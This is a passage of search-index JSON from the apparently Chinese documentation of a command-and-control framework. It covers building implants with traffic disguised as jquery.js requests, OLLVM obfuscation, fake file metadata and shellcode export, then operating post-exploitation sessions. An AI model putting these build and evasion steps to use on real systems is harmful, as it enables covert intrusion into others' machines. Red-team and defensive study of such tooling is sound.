pipeline\u3002</p>"},{"location":"IoM/guideline/payload/#rem-\u4fe1\u9053\u4e0a\u7ebf","title":"REM \u4fe1\u9053\u4e0a\u7ebf","text":"<p>REM \u662f IoM \u57fa\u4e8erem\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u652f\u6301\u66f4\u7075\u6d3b\u7684\u6d41\u91cf\u4f2a\u88c5\uff0c\u5176\u4e2d<code>link</code>\u00a0\u683c\u5f0f\u4e3a<code>[transport]://[key]:@[host]:[port]?wrapper=[]&amp;tls=[bool]&amp;tlsintls=[bool]&amp;compress=[bool]</code>, \u8be6\u7ec6\u53c2\u6570\u8bf7\u9605\u8bfbrem\u53c2\u6570\u89e3\u91ca</p> <pre><code>targets: \n  - address: \"127.0.0.1:34996\" # REM \u670d\u52a1\u5668\u5730\u5740 \n    protocol: \"rem\" \n    rem: link: \"tcp://username:password@127.0.0.1:34996?wrapper=demo123\"\n    rem: \n      link: \"tcp://username:password@127.0.0.1:34996?wrapper=ls...\"\n</code></pre> <p>IoM \u4e2d\u7684\u5927\u591a\u6570\u7f51\u7edc\u529f\u80fd\u5747\u4f9d\u8d56 rem \u5b9e\u73b0\u3002\u4e3a\u4e86\u66f4\u9ad8\u6548\u5730\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u5efa\u8bae\u5728\u64cd\u4f5c\u524d\u5148\u67e5\u9605 rem \u6587\u6863</p>"},{"location":"IoM/guideline/payload/#tls\u52a0\u5bc6","title":"TLS\u52a0\u5bc6","text":"<p>\u5f53\u901a\u4fe1\u7684pipeline\u5f00\u542f\u4e86tls\uff0c\u9700\u8981\u5728profile\u4e2d\u5f00\u542f <code>tls</code> \u914d\u7f6e\uff1a <pre><code>  tls:\n    enable: true                    # \u542f\u7528TLS\n    version: \"auto\"                 # TLS\u7248\u672c: \"auto\", \"1.2\", \"1.3\"\n    sni: \"localhost\"                # \u670d\u52a1\u5668\u540d\u79f0\u6307\u793a\uff08SNI\uff09\n    skip_verification: true\n</code></pre></p> <p>Tip</p> <p>\u60a8\u53ef\u4ee5\u5728listener\u7684config.yaml\u4e2d\u627e\u5230tls\u914d\u7f6e\uff0c\u6765\u786e\u5b9a\u662f\u5426\u9700\u8981\u6253\u5f00tls\u914d\u7f6e\u3002  listener\u7684pipeline\u7684tls\u914d\u7f6e\u53ef\u4ee5\u5728pipeline_tls\u67e5\u9605\u3002</p>"},{"location":"IoM/guideline/payload/#http-\u8bf7\u6c42\u4f2a\u88c5","title":"HTTP \u8bf7\u6c42\u4f2a\u88c5","text":"<p>\u5f53\u901a\u4fe1\u534f\u8bae\u4e3ahttp\u65f6\uff0c\u60a8\u53ef\u4ee5\u914d\u7f6e HTTP \u8bf7\u6c42\u7684\u8def\u5f84\u3001\u65b9\u6cd5\u4e0e Header \u4fe1\u606f\uff1a <pre><code>basic:\n  http:\n    method: \"POST\"  \n    path: \"/jquery.js\"  \n    host: \"127.0.0.1\"  \n    version: \"1.1\"  \n    headers:\n      User-Agent: \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\"\n      Content-Type: \"application/octet-stream\"\n</code></pre></p> <ul> <li> <p><code>method</code> \u5e38\u89c1\u8bbe\u7f6e\u4e3a <code>POST</code> \u6216 <code>GET</code>\u3002</p> </li> <li> <p><code>path</code> \u53ef\u4f2a\u88c5\u6210\u9759\u6001\u8d44\u6e90\u8def\u5f84\uff0c\u5982 <code>.js</code>\u3001<code>.css</code>\u3001<code>.png</code>\u3002</p> </li> <li> <p><code>headers</code> \u652f\u6301\u81ea\u5b9a\u4e49\uff0c\u5efa\u8bae\u6a21\u4eff\u771f\u5b9e\u6d41\u91cf\u7279\u5f81\u3002</p> </li> </ul>"},{"location":"IoM/guideline/payload/#encryption","title":"Encryption","text":"<p>\u5f53\u901a\u4fe1\u7684pipeline\u914d\u7f6e\u4e86 <code>Encryption</code> \u4fe1\u606f\uff0cprofile\u4e5f\u9700\u8981\u540c\u6b65\u8bbe\u7f6e  <code>encryption</code> \u548c <code>key</code> \u5b57\u6bb5 \uff0c\u4e24\u8005\u5185\u5bb9\u548c\u9700\u8981\u4fdd\u6301\u4e00\u81f4\u3002</p> <p>\u5173\u4e8epipeline\u7684Encryption\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Encryption</p> <pre><code>basic:\n  encryption: aes\n  key: maliceofinternal\n</code></pre> <p>\u6709\u5173basic\u914d\u7f6e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 basic</p>"},{"location":"IoM/guideline/payload/#implants","title":"implants","text":"<p>implant\u7684\u529f\u80fd\u6027\u914d\u7f6e\uff0c\u51b3\u5b9a \u8fd0\u884c\u65f6\u884c\u4e3a \u548c \u6a21\u5757\u52a0\u8f7d\u7b56\u7565\u3002</p> <p>\u60a8\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\u6765\u914d\u7f6ebeacon\u6216\u8005modules\u7684\u5185\u7f6e\u6a21\u5757\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e2aimplants\u793a\u4f8b: <pre><code>implants:\n  modules:                           \n    - \"execute_all\"\n    - \"sys_all\"\n</code></pre> \u60a8\u4e5f\u53ef\u4ee5\u5c06 <code>modules</code> \u5b57\u6bb5\u8bbe\u7f6e\u4e3a <code>nano</code>\uff0c\u8fd9\u4f1a\u7f16\u8bd1\u4e00\u7ec4\u9884\u5b9a\u4e49\u7684\u57fa\u7840\u529f\u80fd\u6a21\u5757\uff0c\u53ea\u5305\u542b\u6838\u5fc3\u529f\u80fd\uff0c\u9002\u5408\u6700\u5c0f\u5316 implant \u7684\u4f53\u79ef\u548c\u529f\u80fd\u3002\u4f46\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u540e\u7eed\u9700\u8981\u5728\u8fd9\u4e2a\u6700\u5c0f implant \u4e0a\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u5fc5\u987b\u540c\u65f6\u5f00\u542f <code>hot_load</code> \u5b57\u6bb5\u3002 <pre><code>implants:\n  hot_load: true          \n  modules:                \n    - \"nano\"\n</code></pre></p> <p>\u5982\u679c\u60a8\u9700\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u6a21\u5757\uff0c\u53ef\u4ee5\u5f00\u542f <code>enable_3rd</code> \u5e76\u5728 <code>3rd_modules</code> \u4e2d\u5217\u51fa\u9700\u8981\u7f16\u8bd1\u7684\u6a21\u5757\uff1a <pre><code>implants:\n  enable_3rd: true\n  3rd_modules:\n    - \"curl\"\n    - \"rem\"\n</code></pre></p> <p>\u5728\u7f16\u8bd1prelude\u548cbeacon\u7c7b\u578b\u7684implant\u65f6\uff0c<code>autorun</code> \u5b57\u6bb5\u7528\u4e8e\u6307\u5b9a implant \u4e0a\u7ebf\u65f6\u81ea\u52a8\u6267\u884c\u7684\u914d\u7f6e\u6587\u4ef6 autorun.yaml\uff0c\u8be6\u7ec6\u7684autorun\u5728 autorun\u4e2d\u6709\u8bf4\u660e\u3002 <pre><code>implants:\n  autorun: \"autorun.yaml\"\n</code></pre></p> <p>\u6709\u5173implant\u914d\u7f6e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 implants</p>"},{"location":"IoM/guideline/payload/#build","title":"build","text":"<p><code>build</code> \u4e3b\u8981\u63a7\u5236 \u6784\u5efa\u65b9\u5f0f\u3001\u6df7\u6dc6\u53c2\u6570\u3001PE \u6587\u4ef6\u5143\u4fe1\u606f \u7b49\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6700\u5c0f\u7684build\u90e8\u5206\u793a\u4f8b\uff1a <pre><code>build:\n  zigbuild: true                   \n  remap: false\n  ollvm:\n    enable: false                   \n  metadata:\n    original_filename: \"normal.exe\"\n    file_description: \"normal\"\n    require_admin: true            \n</code></pre> \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c<code>build</code> \u914d\u7f6e\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a</p> <ul> <li> <p>zigbuild\uff1a\u662f\u5426\u542f\u7528 Zig \u7f16\u8bd1\u5668\u6765\u6784\u5efa payload\u3002</p> </li> <li> <p>remap\uff1a\u662f\u5426\u5237\u65b0\u8def\u5f84\u6620\u5c04\u3002</p> </li> <li> <p>ollvm.enable\uff1a\u662f\u5426\u542f\u7528 OLLVM \u6df7\u6dc6\u3002</p> </li> <li> <p>metadata.original_filename\uff1a\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u539f\u59cb\u6587\u4ef6\u540d\u3002</p> </li> <li> <p>metadata.file_description\uff1a\u6587\u4ef6\u63cf\u8ff0\u4fe1\u606f\u3002</p> </li> <li> <p>metadata.require_admin\uff1a\u662f\u5426\u8981\u6c42\u7ba1\u7406\u5458\u6743\u9650\u3002</p> </li> </ul> <p>Tip</p> <p><code>build</code> \u90e8\u5206\u7684ollvm\u6df7\u6dc6\u62e5\u6709\u591a\u79cd\u8bbe\u7f6e\uff0c\u4e5f\u8bbe\u7f6e\u66f4\u591a\u7684\u81ea\u5b9a\u4e49\u5143\u4fe1\u606f\u5b57\u6bb5\u3002\u6709\u5173\u66f4\u591abuild\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 build\u3002</p>"},{"location":"IoM/guideline/payload/#\u65b0\u5efaprofile","title":"\u65b0\u5efaprofile","text":"<p>\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>profile new</code> \u65b0\u5efa\u4e00\u4e2a\u9ed8\u8ba4\u7684profile\uff0c\u5728IoM\u4e2d\uff0cprofile\u662f\u4e0epipeline\u7ed1\u5b9a\u7684\uff0c\u5728\u7f16\u8bd1\u524d\uff0cprofile\u4e2d\u7684 <code>basic</code> \u7684 <code>target</code> \u3001 <code>protocol</code> \u548c <code>tls</code> \u914d\u7f6e\u4f1a\u81ea\u52a8\u4f7f\u7528pipeline\u7684\u914d\u7f6e\u3002</p> <pre><code>profile new --name new-profile --pipeline tcp\n</code></pre>"},{"location":"IoM/guideline/payload/#\u4e0a\u4f20profile","title":"\u4e0a\u4f20profile","text":"<p>\u5f53\u60a8\u9700\u8981\u4e0a\u4f20\u60a8\u7684\u81ea\u5b9a\u4e49profile\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>profile load</code> \u547d\u4ee4\uff0c\u5c06\u60a8\u4fee\u6539\u540e\u7684profile\u4e0a\u4f20\u5230\u670d\u52a1\u7aef\u3002\u6dfb\u52a0profile\u65f6\uff0c\u9700\u8981\u6307\u5b9a\u4e00\u4e2apipeline\uff0c\u4ee5\u4fdd\u8bc1\u7f16\u8bd1\u51fa\u6765\u7684implant\u80fd\u548cpipeline\u901a\u4fe1: <pre><code>profile load config.yaml --name test --pipeline tcp\n</code></pre></p> <p></p> <p>\u5728 gui \u4e2d\u6dfb\u52a0 profile \u65f6\uff0c\u60a8\u9700\u8981\u5728artifacts\u9875\u9762\u4e0a\uff0c\u70b9\u51fbadd profile\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9\u5df2\u6709\u7684 profile \u6587\u4ef6\u8fdb\u884c\u52a0\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u65b0\u5efa\u4e00\u4e2a\u9ed8\u8ba4\u7684profile\u3002 </p> <p>\u60a8\u5df2\u53ef\u4ee5\u70b9\u51fbprofile\u540d\uff0c\u67e5\u770bprofile\u7684\u5177\u4f53\u5185\u5bb9\u3002\u5728\u67e5\u770bprofile\u7684\u754c\u9762\uff0c\u70b9\u51fbedit\uff0c\u5373\u53ef\u7f16\u8f91profile\u3002  </p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>\u51c6\u5907\u597dprofile\u540e\uff0c\u60a8\u53ef\u4ee5\u5728client\u7aef\u4f7f\u7528build\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff0c\u76ee\u524dbuild\u547d\u4ee4\u652f\u6301\u7f16\u8bd1beacon\u3001pulse\u3001prelude\u548cmodules\u3002</p> <p>\u6709\u5173implant\u7684\u7b80\u5355\u4ecb\u7ecd\u53ef\u4ee5\u67e5\u770bimplant\u67b6\u6784</p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1\u547d\u4ee4","title":"\u7f16\u8bd1\u547d\u4ee4","text":"<p><pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl --source saas\n</code></pre> \u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c<code>build</code> \u547d\u4ee4\u5305\u542b\u4ee5\u4e0b\u53c2\u6570\uff1a</p> <ul> <li> <p>profile\uff1a\u6307\u5b9a\u8981\u4f7f\u7528\u7684\u6784\u5efa\u914d\u7f6e\u6587\u4ef6\u540d\u79f0\uff0c\u5fc5\u586b\u9879\u3002</p> </li> <li> <p>target\uff1a\u6307\u5b9a\u6784\u5efa\u76ee\u6807\u5e73\u53f0\u548c\u67b6\u6784\uff0c\u5fc5\u586b\u9879\uff0c\u4f8b\u5982 <code>\"x86_64-pc-windows-gnu\"</code> \u6216 <code>\"x86_64-unknown-linux-musl\"</code> \u3002</p> </li> <li> <p>source\uff1a\u6307\u5b9a\u6784\u5efa\u6765\u6e90\uff0c\u53ef\u4ee5\u662f <code>docker</code>\u3001<code>action</code> \u6216 <code>saas</code> \uff0c\u82e5\u6ca1\u6709\u6307\u5b9a\uff0c\u5219\u4f1a\u5bfb\u627e\u53ef\u7528\u7684\u7f16\u8bd1\u5e73\u53f0\u6765\u7f16\u8bd1 \u3002</p> </li> </ul> <p>target\u4e0esource\u8bf4\u660e</p> <p>target\u67b6\u6784\u5217\u8868\u8be6\u89c1 build source\u4fe1\u606f\u8be6\u89c1 build</p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1beacon","title":"\u7f16\u8bd1beacon","text":"<p>beacon \u662f\u529f\u80fd\u5b8c\u6574\u7684\u4e3b Implant\uff0c\u8fd0\u884c\u5728 beacon \u6a21\u5f0f\u4e0b\u3002</p> <p>\u6700\u7b80\u547d\u4ee4\u793a\u4f8b <pre><code>build beacon --target x86_64-pc-windows-gnu --profile tcp_default\n</code></pre></p> <p>\u5728\u7f16\u8bd1beacon\u7684\u65f6\u5019\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7 <code>--modules</code> \u5e26\u4e0a\u9700\u8981\u6dfb\u52a0\u7684\u989d\u5916modules\u3002 <pre><code>build beacon --target x86_64-pc-windows-gnu --profile tcp_default --modules execute_full\n</code></pre></p> <p>\u60a8\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>--interval</code> \u548c <code>--jitter</code> \u5b57\u6bb5\u6765\u63a7\u5236beacon\u548cprelude\u7684\u56de\u8fde\u65f6\u95f4\uff0c<code>interval</code> \u53c2\u6570\u63a7\u5236\u56fa\u5b9a\u56de\u8fde\u7684\u65f6\u95f4\u95f4\u9694\uff08\u79d2\uff09\uff0c<code>jitter</code> \u53c2\u6570\u63a7\u5236\u5728 interval \u57fa\u7840\u4e0a\u589e\u52a0\u7684\u968f\u673a\u6270\u52a8\u6bd4\u4f8b\uff0c\u907f\u514d\u8fc7\u4e8e\u89c4\u5f8b\u7684\u56de\u8fde\u3002</p> <pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl --interval 1 --jitter 0.2\n</code></pre> <p>\u82e5\u60a8\u9700\u8981\u5728beacon\u4e2d\u4f7f\u7528rem\u63d2\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>--rem</code> \u6765\u914d\u7f6e\u3002 <pre><code>build beacon --profile tcp_default --target x86_64-unknown-linux-musl --rem\n</code></pre></p> <p>\u66f4\u591a\u6709\u5173 <code>build beacon</code> \u547d\u4ee4\u7684\u7f16\u8bd1\u9009\u9879\uff0c\u8bf7\u53c2\u9605 build beacon</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728artifacts\u9875\u9762\uff0c\u5728\u5bf9\u5e94\u7684profile\u884c\u4e0a\u70b9\u51fbbuild\uff0c\u9009\u62e9beacon\u540e\uff0c\u6839\u636e\u9700\u6c42\uff0c\u5728\u5bf9\u5e94\u914d\u7f6e\u884c\u4e0a\u586b\u5165\u4fe1\u606f\uff0c\u8fdb\u884c\u7f16\u8bd1\u3002 </p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1pulse","title":"\u7f16\u8bd1pulse","text":"<p>pulse \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u4e0a\u7ebf\u9a6c\uff0c\u4f53\u79ef\u53ea\u6709 4KB\uff0c\u529f\u80fd\u7c7b\u4f3c\u4e8e CS \u7684 artifact\u3002</p> <p>\u6700\u7b80\u547d\u4ee4\u793a\u4f8b <pre><code>build pulse --profile tcp_default --target x86_64-pc-windows-gnu\n</code></pre></p> <p>\u7f16\u8bd1pulse\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a<code>--artifact-id</code>  \u6765\u6307\u5b9apulse\u94fe\u63a5\u7684beacon\u3002 <pre><code>build pulse --profile tcp_default --target x86_64-pc-windows-gnu --artifact-id 3\n</code></pre></p> <p>\u66f4\u591a\u6709\u5173 <code>build pulse</code> \u547d\u4ee4\u7684\u7f16\u8bd1\u9009\u9879\uff0c\u8bf7\u53c2\u9605 build pulse</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728\u9009\u62e9pulse\u540e\uff0c\u586b\u5165artifact-id\u540e\u8fdb\u884c\u7f16\u8bd1\u3002</p> <p></p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1prelude","title":"\u7f16\u8bd1prelude","text":"<p>prelude \u662f\u4e0a\u7ebf\u6d41\u7a0b\u7684\u4e2d\u95f4 Implant\uff0c\u652f\u6301\u6743\u9650\u7ef4\u6301\u7b49\u529f\u80fd\u3002</p> <p>\u7f16\u8bd1prelude\u65f6\uff0c\u9700\u8981\u4f7f\u7528 <code>--autorun</code> \u6307\u5b9a\u5305\u542bautorun.yaml\u548cresources\u6587\u4ef6\u5939\u7684zip\u538b\u7f29\u5305\u8def\u5f84\u3002 \u8be6\u7ec6\u7684zip\u538b\u7f29\u683c\u5f0f\u5728build\u4e2d\u8bf4\u660e\u3002 \u7f16\u8bd1\u547d\u4ee4\u5982\u4e0b\uff1a <pre><code>build prelude  --profile prelude-profile  --target x86_64-pc-windows-gnu --autorun autorun.zip\n</code></pre></p> <p>\u66f4\u591a\u6709\u5173 <code>build prelude</code> \u547d\u4ee4\u7684\u7f16\u8bd1\u9009\u9879\uff0c\u8bf7\u53c2\u9605 build prelude</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728\u9009\u62e9prelude\u540e\uff0c\u586b\u5165zip\u6587\u4ef6\u8def\u5f84\u540e\u8fdb\u884c\u7f16\u8bd1\u3002</p> <p></p>"},{"location":"IoM/guideline/payload/#\u7f16\u8bd1modules","title":"\u7f16\u8bd1modules","text":"<p>modules \u662f Malefic \u7684\u529f\u80fd\u6a21\u5757\u96c6\u5408\uff0c\u4fbf\u4e8e\u5728\u8fd0\u884c\u65f6\u6309\u9700\u52a8\u6001\u52a0\u8f7d\u3002</p> <p>\u5f53\u60a8\u9700\u8981\u7f16\u8bd1modules\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>--modules</code> \u6765\u6307\u5b9a\u9700\u8981\u7684modules\u8fdb\u884c\u7f16\u8bd1\u3002 <pre><code>build modules --modules execute_exe,execute_dll --profile tcp_default --target x86_64-pc-windows-gnu \n</code></pre></p> <p>\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>--3rd</code> \u6765\u7f16\u8bd1\u7b2c\u4e09\u65b9\u63d2\u4ef6\uff0c\u76ee\u524dImplant\u652f\u6301curl\u548crem\u8fd9\u4e24\u4e2a\u7b2c\u4e09\u65b9\u63d2\u4ef6\u3002 <pre><code>build modules --3rd rem --profile tcp_default --target x86_64-pc-windows-gnu\n</code></pre></p> <p>\u66f4\u591a\u6709\u5173 <code>build modules</code> \u547d\u4ee4\u7684\u7f16\u8bd1\u9009\u9879\uff0c\u8bf7\u53c2\u9605 build modules</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728\u9009\u62e9modules\u540e\uff0c\u5728\u5bf9\u5e94\u7684\u63d2\u4ef6\u884c\u4e0a\u586b\u5165\u9700\u8981\u7684\u63d2\u4ef6\uff0c\u7136\u540e\u8fdb\u884c\u7f16\u8bd1\u3002</p> <p></p> <p></p>"},{"location":"IoM/guideline/payload/#artifact","title":"artifact","text":"<p>\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 <code>artifact list</code> \u547d\u4ee4\u67e5\u770b\u6240\u6709\u7684artifact\u3002</p> <pre><code>artifact list\n</code></pre> <p></p> <p>\u5728artifact\u8868\u683c\u4e2d\u9009\u4e2d\u5bf9\u5e94artifact\uff0c\u5373\u53ef\u5c06artifact\u6e90\u6587\u4ef6\u4e0b\u8f7d\u5230client\u7aef\u3002</p> <p>\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>artifact download</code> \u6765\u6307\u5b9a\u60f3\u8981\u4e0b\u8f7d\u7684artifact\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a <code>--format</code> \u6765\u8bbe\u7f6eartifact\u7684\u4e0b\u8f7d\u683c\u5f0f\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u8f7dartifact\u7684shellcode\u683c\u5f0f\uff1a</p> <pre><code>artifact download artifact-name --format raw\n</code></pre> <p>\u66f4\u591a\u7684format\u683c\u5f0f\uff0c \u8bf7\u53c2\u9605build</p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728artifact\u9875\u9762\u4e0a\u70b9\u51fb\u5bf9\u5e94\u7684artifact\u884c\u4e0a\u7684download\u6309\u94ae\uff0c\u5373\u53ef\u4e0b\u8f7dartifact\u6e90\u6587\u4ef6\u5230\u6307\u5b9a\u8def\u5f84\u3002 </p> <p>\u5f53artifact\u7f16\u8bd1\u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6765\u67e5\u770blog(\u76ee\u524d\u652f\u6301\u67e5\u770bdocker\uff0c\u540e\u7eed\u4f1a\u52a0\u4e0asaas\uff09\uff1a</p> <pre><code>build log artifact_name\n</code></pre> <p></p> <p>\u5728gui\u4e2d\uff0c\u53ef\u4ee5\u53f3\u51fb\u5bf9\u5e94artifact\u884c\uff0c\u70b9\u51fbShow Artifact Log, \u53ef\u4ee5\u67e5\u770blog\u3002</p> <p></p>"},{"location":"IoM/guideline/post_exploitation/","title":"\u540e\u6e17\u900f\u57fa\u672c\u64cd\u4f5c","text":""},{"location":"IoM/guideline/post_exploitation/#implant-console","title":"implant console","text":"<p>Implant \u63a7\u5236\u53f0\u662f\u540e\u6e17\u900f\u9636\u6bb5\u4e0e\u76ee\u6807\u4f1a\u8bdd\u4ea4\u4e92\u7684\u6838\u5fc3\u754c\u9762\uff0c\u7528\u4e8e\u4e0b\u53d1\u6307\u4ee4\u3001\u67e5\u770b\u4efb\u52a1\u72b6\u6001\u4e0e\u63a5\u6536\u6267\u884c\u7ed3\u679c\uff0c\u662f\u64cd\u4f5c Implant \u7684\u4e3b\u8981\u5165\u53e3\u3002</p> <p>\u8fdb\u884c\u540e\u6e17\u900f\u64cd\u4f5c\u4e4b\u524d\uff0c\u9996\u5148\u9700\u8981\u4f7f\u7528 <code>session</code> \u547d\u4ee4\u67e5\u770b\u9700\u8981\u8fde\u63a5\u7684\u4f1a\u8bdd\u4fe1\u606f\uff0c\u7136\u540e\u9009\u62e9\u5bf9\u5e94\u7684\u4f1a\u8bdd\u8fdb\u884c\u8fde\u63a5\u3002</p> <pre><code>session\n</code></pre> <p></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>use</code> \u547d\u4ee4\u8fde\u63a5\u5bf9\u5e94\u7684\u4f1a\u8bdd\uff0c\u4f7f\u7528tab\u952e\u8865\u5168\u65f6\uff0c\u4e5f\u53ef\u4ee5\u67e5\u770b\u4f1a\u8bdd\u4fe1\u606f\u3002</p> <pre><code>use [session-id]\n</code></pre> <p></p> <p>\u5728gui\u4e0a\uff0c\u60a8\u9700\u8981\u5728sessions\u754c\u9762\u70b9\u51fb\u5bf9\u5e94session\u7684\u547d\u4ee4\u884c\u6309\u94ae\uff0c\u8fde\u63a5\u5bf9\u5e94\u7684session\u3002\u4e5f\u53ef\u4ee5\u53f3\u51fb\u5bf9\u5e94session\uff0c\u70b9\u51fbInteractive Session\u6309\u94ae\u8fde\u63a5\u3002</p> <p></p> <p></p> <p>\u63a7\u5236\u53f0\u4f1a\u5b8c\u6574\u5448\u73b0\u4f1a\u8bdd\u4ea4\u4e92\u8fc7\u7a0b\uff1a\u5df2\u4e0b\u53d1\u4efb\u52a1\u53ca\u4e0b\u8f7d\u65f6\u95f4\u6e05\u6670\u53ef\u67e5\uff0c\u7cfb\u7edf\u4fe1\u606f\u3001\u6587\u4ef6\u5217\u8868\u3001\u6743\u9650\u64cd\u4f5c\u53cd\u9988\u7b49\u547d\u4ee4\u8f93\u51fa\u5b9e\u65f6\u5c55\u793a\uff0c\u64cd\u4f5c\u65e5\u5fd7\u4e0e\u72b6\u6001\u4fe1\u606f\uff08\u5982\u6a21\u5757\u52a0\u8f7d\u3001\u8fdb\u7a0b\u542f\u52a8\u7b49\uff09\u4e5f\u4f1a\u540c\u6b65\u5448\u73b0\uff0c\u5e2e\u4f60\u5168\u9762\u638c\u63e1\u4f1a\u8bdd\u52a8\u6001\u3002  </p>"},{"location":"IoM/guideline/post_exploitation/#sessions","title":"sessions","text":"<p>\u5728 Implant \u63a7\u5236\u53f0\u7684\u8f93\u5165\u533a\u4e0e\u8f93\u51fa\u533a\u4e4b\u95f4\uff0c\u8bbe\u6709\u72b6\u6001\u680f\uff0c\u5b9e\u65f6\u663e\u793a\u5f53\u524d\u4f1a\u8bdd\u5173\u952e\u4fe1\u606f\u3002\u7ed3\u5408\u754c\u9762\u793a\u4f8b\uff0c\u9ed8\u8ba4\u5305\u542b\uff1a - \u7cfb\u7edf\u57fa\u7840\u4fe1\u606f\uff1aOS\uff08\u5982 <code>windows x64</code> \uff09\u3001Hostname\uff08\u76ee\u6807\u4e3b\u673a\u540d\uff0c\u754c\u9762\u4e2d\u53ef\u5bf9\u5e94\u67e5\u770b\uff09\u3001Process\uff08\u8fdb\u7a0b\u540d\u4e0e PID\uff0c\u5982 <code>malfic.exe</code> \u53ca <code>PID:43628</code> \u6837\u5f0f \uff09\u3001User\uff08\u5f53\u524d\u4f1a\u8bdd\u7528\u6237\u540d \uff09\u3002 - \u4f1a\u8bdd\u6838\u5fc3\u53c2\u6570\uff1aSession ID\uff08\u4f1a\u8bdd\u552f\u4e00\u6807\u8bc6\uff0c\u5982 <code>08d6c05a2152a79a3bde9d3b2a8f26f</code> \uff09\u3001Pipeline ID\uff08\u901a\u4fe1\u7ba1\u9053\u6807\u8bc6\uff0c\u5982 <code>tcp</code> \uff09\u3001Listener Name\uff08\u76d1\u542c\u5668\u540d\u79f0\uff0c\u5982 <code>listener</code> \uff09\u3001Group Name\uff08\u5206\u7ec4\uff0c\u5982 <code>default</code> \uff09\u3002 - \u8fde\u901a\u6027\u72b6\u6001\uff1aImplant \u4e0e\u670d\u52a1\u7aef\u7684 check-in \u72b6\u6001\uff08\u5982\u754c\u9762\u4e2d <code>ALIVE</code> <code>DEAD</code> \u6807\u8bc6\uff0c\u53cd\u6620\u4f1a\u8bdd\u6d3b\u8dc3\u5ea6\u4e0e\u8fde\u901a\u6027 \uff09\u3002 - \u6a21\u5757\u5217\u8868\uff1a\u663e\u793aImplant\u5f53\u524d\u5df2\u52a0\u8f7d\u7684\u6240\u6709\u529f\u80fd\u6a21\u5757\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u63a7\u5236\u53f0\u547d\u4ee4\u8bb0\u5f55","title":"\u63a7\u5236\u53f0\u547d\u4ee4\u8bb0\u5f55","text":"<p>\u547d\u4ee4\u8bb0\u5f55\u89c4\u5219\uff1a\u65e0\u8bba\u901a\u8fc7\u56fe\u5f62\u754c\u9762\uff08\u70b9\u51fb\u6a21\u5757\u6309\u94ae\uff09\u8fd8\u662f\u63a7\u5236\u53f0\u8f93\u5165\u4e0b\u53d1\u7684\u547d\u4ee4\uff0c\u90fd\u4f1a\u5728\u63a7\u5236\u53f0\u7a97\u53e3\u7559\u5b58\u8bb0\u5f55\uff0c\u65b9\u4fbf\u8ffd\u6eaf\u64cd\u4f5c\u5386\u53f2\u3001\u6392\u67e5\u6267\u884c\u95ee\u9898\uff08\u5982\u547d\u4ee4\u662f\u5426\u4e0b\u53d1\u6210\u529f\u3001\u53c2\u6570\u662f\u5426\u6b63\u786e \uff09\u3002  </p> <p> </p>"},{"location":"IoM/guideline/post_exploitation/#\u67e5\u770b\u57fa\u7840\u547d\u4ee4\u5217\u8868","title":"\u67e5\u770b\u57fa\u7840\u547d\u4ee4\u5217\u8868","text":"<p>\u5728 IoM \u5ba2\u6237\u7aef\u6216 GUI \u63a7\u5236\u53f0\u4e2d\uff0c\u60a8\u5c06\u4e3b\u8981\u901a\u8fc7\u547d\u4ee4\u4e0e IoM \u4ea4\u4e92\u3002\u5efa\u8bae\u5148\u719f\u6089\u5e38\u7528\u547d\u4ee4\u3002\u5728\u63a7\u5236\u53f0\u4e2d\u8f93\u5165 <code>help</code> \u53ef\u67e5\u770b\u5168\u90e8\u53ef\u7528\u547d\u4ee4\u3002 